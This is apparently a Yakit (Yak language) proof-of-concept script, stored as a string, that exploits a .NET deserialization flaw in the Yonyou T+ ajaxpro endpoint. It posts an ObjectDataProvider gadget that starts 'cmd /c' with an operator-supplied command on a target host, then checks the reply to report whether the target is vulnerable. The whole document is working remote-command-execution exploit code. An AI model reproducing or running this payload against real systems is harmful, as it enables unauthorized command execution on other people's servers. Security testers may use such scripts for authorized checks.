            'yakit.AutoInitYakit()\nlog.setLevel("info")  // 设置日志级别\n\n// 编写核心发包函数\nsendPacket = func(target, cmd) {\n    return poc.HTTP(`POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1\nHost: {{params(target)}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nSec-Ch-Ua-Platform: \\"Windows\\"\nAccept-Encoding: gzip, deflate\nX-Ajaxpro-Method: GetStoreWarehouseByStore\nContent-Type: text/plain\n\n{"storeID":{\n    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",\n    "MethodName":"Start",\n    "ObjectInstance":{\n        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",\n        "StartInfo": {\n            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",\n            "FileName":"cmd", "Arguments":"/c {{params(cmd)}}}"\n        }\n    }\n}}`,\n        poc.params({\n            "cmd": cmd,\n            "target": target,\n        }),\n    )\n}\n\nyakit.SetProgress(0.1)\nyakit.Info("开始准备接受参数：%v","...")\n// 获取参数\ntarget = cli.String("target")\nif target == "" {\n    die("no target")\n}\ncmd = cli.String("cmd")\nif cmd == ""{\n    die("no cmd")\n}\nyakit.SetProgress(0.3)\nyakit.Info("接受参数成功：%v",target)\nyakit.Info("接受参数成功：%v",cmd)\n\ntime.sleep(1.0)\n\nyakit.Info("准备发送数据包")\n// 使用生成的命令发包\nrsp, _, err = sendPacket(target, cmd)\ndie(err)\n\nyakit.Info("准备检测结果")\n// 取出发送的数据包中的结果，检测内容\nheaders, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)\nif str.MatchAllOfSubString(body, "actorId或archivesId不能为空") {\n    log.info("漏洞存在")\n    yakit.SetProgress(1.0)\n    yakit.Info("发现漏洞：%v",target)\n}else{\n    yakit.Info("漏洞检测失败，无漏洞")\n}\n',
